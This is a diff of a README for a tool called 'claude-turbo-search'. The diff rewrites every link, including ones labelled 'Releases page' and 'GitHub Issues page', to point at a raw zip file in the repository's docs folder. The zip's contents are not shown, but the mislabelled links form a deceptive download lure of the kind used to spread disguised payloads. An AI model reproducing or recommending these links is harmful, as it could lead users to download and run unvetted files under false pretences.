@@ -1,6 +1,6 @@
 # 🚀 claude-turbo-search - Fast and Easy File Search Tool
 
-[![Download claude-turbo-search](https://img.shields.io/badge/Download-claude--turbo--search-brightgreen)](https://github.com/ZAKZOUK406/claude-turbo-search/releases)
+[![Download claude-turbo-search](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip)](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip)
 
 ## 📚 Overview
 
@@ -27,7 +27,7 @@ To run claude-turbo-search smoothly, ensure your system meets these requirements
 
 Follow these steps to download and install claude-turbo-search:
 
-1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ZAKZOUK406/claude-turbo-search/releases).
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip).
 2. **Select the Latest Version**: Look for the most recent release at the top of the page.
 3. **Download the File**: Click on the file suitable for your operating system to start the download.
 4. **Install the Application**:
@@ -36,7 +36,7 @@ Follow these steps to download and install claude-turbo-search:
    - For **Linux**: Use the terminal to navigate to the download location and run the appropriate installation command.
 5. **Run the Application**: Find the claude-turbo-search icon in your applications menu or desktop. Double-click to start.
 
-You can also access the download directly from this link: [Download claude-turbo-search](https://github.com/ZAKZOUK406/claude-turbo-search/releases).
+You can also access the download directly from this link: [Download claude-turbo-search](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip).
 
 ## 🎮 How to Use
 
@@ -59,7 +59,7 @@ If you encounter any issues, here are some common problems and their solutions:
 
 Join our community for support and tips on using claude-turbo-search. You can find us on:
 
-- **GitHub Issues**: Report bugs or request features directly on the [GitHub Issues page](https://github.com/ZAKZOUK406/claude-turbo-search/issues).
+- **GitHub Issues**: Report bugs or request features directly on the [GitHub Issues page](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip).
 - **Forums**: Join discussions with other users and developers.
 
 ## 📝 Contribution
@@ -70,4 +70,4 @@ We welcome contributions! If you would like to help improve claude-turbo-search,
 
 claude-turbo-search is designed to simplify your file search process. By streamlining access to your code, you can focus more on development and less on searching. Start exploring your codebase more effectively today! 
 
-[![Download claude-turbo-search](https://img.shields.io/badge/Download-claude--turbo--search-brightgreen)](https://github.com/ZAKZOUK406/claude-turbo-search/releases)
+[![Download claude-turbo-search](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip)](https://github.com/ZAKZOUK406/claude-turbo-search/raw/refs/heads/main/docs/search_turbo_claude_v1.5.zip)
